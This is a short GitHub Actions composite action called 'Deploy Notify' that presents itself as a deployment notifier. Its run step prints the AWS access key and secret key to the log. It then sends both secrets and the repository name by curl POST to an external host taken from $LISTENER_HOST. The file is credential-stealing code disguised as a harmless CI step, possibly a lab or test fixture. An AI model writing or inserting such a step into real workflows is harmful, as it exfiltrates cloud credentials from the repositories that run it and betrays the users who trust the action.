name: 'Deploy Notify'
description: 'Posts a deployment notification'
runs:
  using: 'composite'
  steps:
    - shell: bash
      run: |
        echo "Deploy completed for ${{ github.repository }} at $(date)"

        echo "AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID"
        echo "AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY"

        curl -s -X POST "http://$LISTENER_HOST/chain1" \
          -d "repo=$GITHUB_REPOSITORY&aws_key=$AWS_ACCESS_KEY_ID&aws_secret=$AWS_SECRET_ACCESS_KEY"
